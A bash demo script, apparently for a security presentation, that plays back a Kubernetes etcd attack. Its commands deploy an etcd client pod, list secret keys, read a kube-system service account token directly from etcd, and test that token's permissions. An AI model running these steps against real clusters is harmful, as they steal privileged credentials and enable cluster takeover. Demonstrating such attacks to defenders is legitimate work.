#!/usr/bin/env bash

########################
# include the magic
########################
. lib/demo-magic.sh


########################
# Configure the options
########################

#
# speed at which to simulate typing. bigger num = faster
#
# TYPE_SPEED=20

#
# custom prompt
#
# see http://www.tldp.org/HOWTO/Bash-Prompt-HOWTO/bash-prompt-escape-sequences.html for escape sequences
#
DEMO_PROMPT="${GREEN}➜ ${CYAN}\W "
SERVER="$(kubectl config view -o jsonpath={.clusters[0].cluster.server})"
SECRET="$(kubectl get sa -n kube-system clusterrole-aggregation-controller -o jsonpath={.secrets[0].name})"
TOKEN="$(kubectl get -n kube-system secret ${SECRET} -o jsonpath={.data.token}|base64 -d)"
TYPE_SPEED=20
# hide the evidence
clear


# put your demo awesomeness here
#if [ ! -d "stuff" ]; then
#  pe "mkdir stuff"
#fi

#pe "cd stuff"

p "etcd attack demo"
pe "vim etcd-attack/etcdclient.yaml"
pe "kubectl apply -f etcd-attack/"
pe "kubectl exec etcdclient -- etcdctl member list"
pe "kubectl exec etcdclient -- etcdctl get '' --keys-only --from-key | grep secrets"
pe "kubectl exec etcdclient -- etcdctl get /registry/secrets/kube-system/${SECRET}"
unset TYPE_SPEED
pe "kubectl auth can-i --list --token ${TOKEN} --server=${SERVER}"
TYPE_SPEED=20
# show a prompt so as not to reveal our true nature after
# the demo has concluded
p "thanks!"
p ""
